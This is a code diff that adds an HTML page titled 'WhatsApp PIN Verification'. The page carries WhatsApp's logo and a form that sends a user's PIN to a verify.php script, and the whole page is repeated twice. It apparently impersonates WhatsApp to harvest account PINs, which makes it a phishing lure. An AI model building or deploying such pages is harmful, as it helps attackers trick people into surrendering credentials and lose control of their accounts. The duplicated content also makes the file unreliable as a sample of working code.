@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>WhatsApp PIN Verification</title>
+  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/1200px-WhatsApp.svg.png">
+</head>
+<body>
+  <h1>WhatsApp PIN Verification</h1>
+  <form action="verify.php" method="post">
+    <label for="pin">PIN:</label><br>
+    <input type="text" id="pin" name="pin"><br><br>
+    <input type="submit" value="Verify">
+  </form> 
+</body>
+</html>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>WhatsApp PIN Verification</title>
+  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/1200px-WhatsApp.svg.png">
+</head>
+<body>
+  <h1>WhatsApp PIN Verification</h1>
+  <form action="verify.php" method="post">
+    <label for="pin">PIN:</label><br>
+    <input type="text" id="pin" name="pin"><br><br>
+    <input type="submit" value="Verify">
+  </form> 
+</body>
+</html>
